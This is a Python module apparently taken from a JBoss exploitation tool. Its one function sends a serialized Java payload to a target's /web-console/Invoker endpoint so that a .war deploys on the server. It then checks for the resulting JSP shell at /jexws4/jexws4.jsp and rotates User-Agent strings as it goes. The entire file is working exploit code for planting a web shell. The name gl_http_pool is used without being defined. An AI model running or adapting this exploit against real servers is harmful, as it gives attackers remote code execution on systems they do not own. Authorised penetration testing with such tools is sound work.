from src.exploits.ex1 import get_successfully
from src.payloads.exploit_web_console_invoker import payload__exploit_web_console_invoker
from src.utils.misc import print_and_flush, get_random_user_agent


def exploit_web_console_invoker(url: str) -> int:
    """
    Exploits the Web Console Invoker in JBoss to deploy a .war, returns the deployment status.
    """
    payload = payload__exploit_web_console_invoker
    headers = {
        "Content-Type": "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
        "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent(),
    }
    r = gl_http_pool.urlopen("POST", f"{url}/web-console/Invoker",
                             redirect=False, headers=headers, body=payload)
    if r.status == 401:
        print_and_flush("   Retrying...")
        gl_http_pool.urlopen("HEAD", f"{url}/web-console/Invoker",
                             redirect=False, headers=headers, body=payload)
    return get_successfully(url, "/jexws4/jexws4.jsp")
